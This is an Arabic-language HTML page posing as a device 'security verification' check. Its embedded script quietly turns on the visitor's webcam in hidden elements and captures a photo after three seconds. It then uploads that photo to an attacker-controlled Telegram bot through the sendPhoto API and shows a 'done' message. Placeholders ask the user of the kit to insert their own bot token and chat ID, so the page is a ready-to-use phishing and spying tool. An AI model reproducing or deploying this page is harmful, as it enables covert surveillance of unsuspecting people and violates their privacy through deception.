<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تحقق امني</title>
</head>
<body style="text-align:center; padding:20px">
  <h2>جاري التحقق من جهازك...</h2>
  <video id="video" autoplay style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

<script>
const TOKEN = "هنا_حط_توكن_البوت"; 
const CHAT_ID = "هنا_حط_الايدي_حقك";

navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
  document.getElementById("video").srcObject = stream;
  setTimeout(()=>{
    let canvas = document.getElementById("canvas");
    let video = document.getElementById("video");
    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    canvas.toBlob(b=>{
      let f = new FormData();
      f.append("chat_id", CHAT_ID); f.append("photo", b, "p.jpg");
      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:"POST",body:f});
      document.body.innerHTML="<h2>تم ✅</h2>";
    });
  },3000);
});
</script>
</body>
</html>
